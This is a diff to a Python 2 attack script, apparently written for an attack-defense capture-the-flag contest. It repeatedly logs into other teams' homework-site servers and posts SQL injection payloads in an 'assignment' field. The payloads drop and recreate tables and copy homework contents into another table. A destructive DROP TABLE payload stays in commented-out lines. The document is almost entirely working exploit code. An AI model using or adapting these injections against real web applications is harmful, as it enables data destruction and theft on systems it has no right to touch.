@@ -1,7 +1,9 @@
 import requests
 
 while 1 == 1:
-    for i in range(10):
+    for i in range(12):
+        if i != 3:
+            continue
         try:
             site = 'http://ctfteam%d.mit.edu:3000' % (i+2)
             print site
@@ -16,8 +18,17 @@ while 1 == 1:
             myCookies['login'] = r.cookies['login']
             myCookies['teacher'] = r.cookies['teacher']
 
-            evil = {'assignment' : "Herp'); SELECT * FROM assignments; DROP TABLE assignments; --"}
+            evil = {'assignment' : "Derp'); CREATE TABLE assignments (class_id integer, student_id integer, homework text); CREATE TABLE users (user_id integer, username text, salt text, password text, teacher boolean); --"}
             r = requests.post(site + '/homework/1/', cookies=myCookies, data=evil)
             print r.text
+
+            evil = {'assignment' : "Werp'); INSERT INTO classes (class_id, name) SELECT RANDOM() * 100000, homework FROM assignments; --"}
+            r = requests.post(site + '/homework/1/', cookies=myCookies, data=evil)
+            print r.text
+
+            #evil = {'assignment' : "Herp'); DROP TABLE assignments; --"}
+            #r = requests.post(site + '/homework/2/', cookies=myCookies, data=evil)
+            #print r.text
         except Exception:
             pass
+
